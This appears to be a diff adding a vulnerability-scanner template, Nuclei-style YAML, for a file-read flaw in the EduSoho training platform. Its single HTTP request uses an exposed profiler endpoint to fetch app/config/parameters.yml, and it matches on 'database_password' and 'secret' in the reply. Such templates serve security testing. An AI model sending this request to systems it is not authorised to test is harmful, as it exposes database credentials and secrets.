@@ -1,0 +1,21 @@
+id: edusoho-education-open-fileread
+
+info:
+  name: EduSoho 教培系统 open 文件 file 参数文件读取漏洞
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "database_password"
+          - "secret"
+        part: body
+        condition: and
